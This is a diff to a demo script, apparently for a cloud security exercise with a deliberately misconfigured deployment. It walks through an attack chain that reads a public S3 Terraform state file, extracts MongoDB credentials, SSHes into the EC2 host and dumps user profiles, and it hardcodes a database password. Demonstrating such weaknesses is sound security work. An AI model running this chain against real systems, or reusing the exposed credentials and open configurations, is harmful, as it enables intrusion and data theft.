@@ -392,13 +392,14 @@ ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "lsb_release -a"
 aws ec2 describe-security-groups --group-ids sg-03dce51e1f51d0137 \
   --query "SecurityGroups[0].IpPermissions" --output table
 
-# Show AdministratorAccess IAM role on EC2
-aws ec2 describe-instances \
-  --filters "Name=tag:Name,Values=movie-buddy-mongodb" \
-  --query "Reservations[0].Instances[0].IamInstanceProfile.Arn" --output text
+# Show AdministratorAccess IAM policy attached to the EC2 role
+aws iam list-attached-role-policies \
+  --role-name movie-buddy-ec2-role \
+  --query "AttachedPolicies[*].PolicyName" \
+  --output table
 ```
 
-### Attack path demo — public S3 → credentials → database
+### Attack path demo — public S3 → credentials → SSH → database
 ```bash
 # Step 1: Show S3 bucket is publicly readable (open in browser, no credentials)
 # URL: https://movie-buddy-db-backups.s3.amazonaws.com/
@@ -410,9 +411,12 @@ aws s3 ls s3://movie-buddy-tfstate-329153220664/wiz-exercise/
 aws s3 cp s3://movie-buddy-tfstate-329153220664/wiz-exercise/terraform.tfstate - \
   | python3 -m json.tool | grep -A3 mongodb_url
 
-# Step 4: Use extracted credentials to connect to MongoDB and dump data
-# (replace password if needed — it's in the state file output above)
-mongosh "mongodb://admin:MovieBuddy2024\!@100.52.232.237:27017" \
+# Step 4: SSH into the EC2 server using the open SSH port (second weakness)
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237
+
+# Step 5: Once inside EC2, connect to MongoDB using the credentials from Step 3
+# (MongoDB is on localhost from inside EC2)
+mongosh "mongodb://admin:MovieBuddy2024\!@localhost:27017" \
   --eval "db.getSiblingDB('movie_buddy').profiles.find().pretty()"
 ```
-*(Note: mongosh must be installed locally for Step 4. Alternative: SSH into EC2 first, then run mongosh from there)*
+*(This chains two weaknesses: public S3 exposes credentials → open SSH provides access → full DB dump. Say out loud: "An attacker with just a browser and an SSH client can do everything I just did.")*
